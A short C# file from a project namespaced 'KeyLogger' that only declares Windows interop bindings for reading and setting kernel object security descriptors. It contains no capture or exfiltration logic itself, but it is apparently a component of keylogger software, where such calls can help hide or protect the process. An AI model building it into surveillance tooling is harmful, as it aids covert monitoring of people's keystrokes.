using System;
using System.Runtime.InteropServices;

namespace KeyLogger.WinApis
{
	public class AdvApi32
	{
		[DllImport( "advapi32.dll", SetLastError = true )]
		public static extern bool GetKernelObjectSecurity(
		 IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded );

		[DllImport( "advapi32.dll", SetLastError = true )]
		public static extern bool SetKernelObjectSecurity( IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor );
	}
}
